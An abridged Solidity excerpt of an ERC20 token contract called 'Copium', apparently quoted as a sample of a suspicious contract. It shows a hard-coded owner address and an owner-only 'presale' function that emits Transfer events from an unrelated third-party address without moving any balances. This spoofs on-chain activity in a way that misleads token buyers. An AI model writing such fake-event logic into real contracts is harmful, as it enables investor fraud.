...
contract Copium is Context, IERC20 {
    ...
    address team;
    address public _Owner = 0x7DEcF985a2279913B41F06ac848992F508537aB5;
    ...
    constructor () public {
        ...
        team = 0x7DEcF985a2279913B41F06ac848992F508537aB5;
    ...
    function presale(address[] memory eReceiver,uint256[] memory eAmounts)  public _onlyOwner(){
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(0x91364516D3CAD16E1666261dbdbb39c881Dbe9eE, eReceiver[i], eAmounts[i]);}}
